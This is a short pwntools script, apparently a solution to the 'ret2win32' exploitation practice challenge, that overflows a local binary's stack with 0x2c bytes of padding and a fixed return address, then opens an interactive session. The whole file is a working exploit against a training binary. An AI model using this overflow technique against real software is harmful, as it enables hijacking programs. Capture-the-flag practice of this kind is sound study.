from pwn import *
context.log_level = 'debug'
sh = process("./ret2win32")

payload = flat(b'a' * 0x2c, p32(0x08048659))
sh.recv()
sh.sendline(payload)
sh.recv()
sh.interactive()